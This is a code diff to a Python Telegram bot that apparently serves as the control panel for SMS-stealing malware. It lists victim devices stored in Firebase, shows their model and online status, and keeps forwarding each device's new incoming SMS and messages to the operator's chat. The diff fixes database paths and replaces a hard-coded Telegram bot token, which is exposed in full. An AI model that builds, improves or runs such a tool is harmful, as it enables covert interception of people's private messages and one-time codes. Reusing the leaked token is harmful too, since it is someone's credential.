@@ -94,7 +94,10 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     url = context.args[0].replace('.json', '').rstrip('/')
-    firebase_base = f"{url}/user_data"
+    if not url.endswith('/clients'):
+        firebase_base = f"{url}/user_data"
+    else:
+        firebase_base = url
         
     await update.message.reply_text('✅ Firebase Connect Successfully!\n\nNext Step: /setdevice command use karein.')
 
@@ -155,7 +158,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
-            response = requests.get(f"{firebase_base}/{client_id}.json")
+            response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
             details = response.json()
             status = "ONLINE 🟢" if details.get('status') == True else "OFFLINE 🔴"
             msg = (f"📱 {details.get('modelName', 'Unknown')}\n"
@@ -191,7 +194,9 @@ async def monitor_task(chat_id, context):
         if sms_data and isinstance(sms_data, dict):
             last_sms_key = list(sms_data.keys())[-1]
 
-        msg_data = requests.get(f"{firebase_base}/{selected_device_id}/messages.json").json()
+        msg_data = requests.get(
+            f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
+        ).json()
         if msg_data and isinstance(msg_data, dict):
             last_msg_key = list(msg_data.keys())[-1]
 
@@ -200,36 +205,60 @@ async def monitor_task(chat_id, context):
 
     while is_monitoring:
         try:
-            sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
+            sms_data = requests.get(
+                f"{firebase_base}/{selected_device_id}/sms.json"
+            ).json()
 
             if sms_data and isinstance(sms_data, dict):
                 keys = list(sms_data.keys())
+
                 if keys[-1] != last_sms_key:
                     last_sms_key = keys[-1]
+
                     sms = sms_data[last_sms_key]
+
                     if isinstance(sms, dict):
                         sender = sms.get("sender", "Unknown")
                         time = sms.get("dateTime", "Unknown")
                         message = sms.get("message", "")
-                        text = (f"📩 New Incoming SMS\n\n📱 From: {sender}\n🕒 Time: {time}\n\n💬 Message: {message}")
+
+                        text = (
+                            "📩 New Incoming SMS\n\n"
+                            f"📱 From: {sender}\n"
+                            f"🕒 Time: {time}\n\n"
+                            f"💬 Message: {message}"
+                        )
                     else:
                         text = f"📩 New Incoming SMS\n\n{sms}"
+
                     await context.bot.send_message(chat_id=chat_id, text=text)
 
-            msg_data = requests.get(f"{firebase_base}/{selected_device_id}/messages.json").json()
+            msg_data = requests.get(
+                f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
+            ).json()
 
             if msg_data and isinstance(msg_data, dict):
                 keys = list(msg_data.keys())
+
                 if keys[-1] != last_msg_key:
                     last_msg_key = keys[-1]
+
                     msg = msg_data[last_msg_key]
+
                     if isinstance(msg, dict):
                         sender = msg.get("sender", "Unknown")
                         time = msg.get("dateTime", "Unknown")
                         message = msg.get("message", "")
-                        text = (f"📩 New Incoming SMS\n\n📱 From: {sender}\n🕒 Time: {time}\n\n💬 Message: {message}")
+
+                        text = (
+                            "📩 New Incoming SMS\n\n"
+                            f"📱 From: {sender}\n"
+                            f"🕒 Time: {time}\n\n"
+                            f"💬 Message: {message}"
+                        )
                     else:
                         text = f"📩 New Incoming SMS\n\n{msg}"
+
                     await context.bot.send_message(chat_id=chat_id, text=text)
 
         except Exception as e:
@@ -272,7 +301,7 @@ async def forward_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.effective_chat.send_message(f"❌ Error: {str(e)}")
 
 if __name__ == '__main__':
-    TOKEN = '8625469610:AAE2R7UpGmuyC7atp7xvX3f8Lns-u9PmCrE'
+    TOKEN = '8720005848:AAGxPsJFZTG1-4boeVFXoKYOMOK5QMnyuf4'
     app = ApplicationBuilder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("addpremium", add_premium))
@@ -284,4 +313,3 @@ if __name__ == '__main__':
     app.add_handler(CallbackQueryHandler(button_handler))
     app.add_handler(MessageHandler(filters.ChatType.CHANNEL, forward_messages))
     app.run_polling()
-                    
